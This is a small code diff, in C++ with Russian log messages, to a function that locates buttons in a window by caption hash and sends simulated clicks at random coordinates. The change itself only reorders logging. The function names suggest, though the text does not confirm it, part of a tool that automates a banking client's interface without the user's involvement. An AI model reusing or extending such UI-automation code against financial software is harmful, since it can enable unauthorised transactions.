@@ -293,16 +293,17 @@ DWORD  BSSClickToButtons(HWND Form, bool MultiClick, DWORD BtnCaptionHash)
 
 		// Кликаем по кнопке
 		DWORD X = Random::Generate(2, 30);
-        DWORD Y = Random::Generate(2, 10);
+		DWORD Y = Random::Generate(2, 10);
+
+		BSSSIGNLOG(NULL, false, "Кликаем по кнопке [%d][%s]", Button, Text.t_str());
+		BSSSIGNLOG(NULL, false, "Координаты %d, %d", X, Y);
+
 		if (HardClickToWindow(Button, X, Y))
 		{
-			BSSSIGNLOG(NULL, false, "Кликаем по кнопке [%d][%s]", Button, Text.t_str());
-			BSSSIGNLOG(NULL, false, "Координаты %d, %d", X, Y);
+			BSSSIGNLOG(NULL, false, "Новый текст кнопки: [%s] \r\n\r\n", GetWndText2(Button).t_str());
 
 			Count++;
 			pSleep(Random::Generate(1000, 1500));
-
-            BSSSIGNLOG(NULL, false, "Новый текст кнопки: [%s] \r\n\r\n", GetWndText2(Button).t_str());
 
 			if (!MultiClick) break;
         }
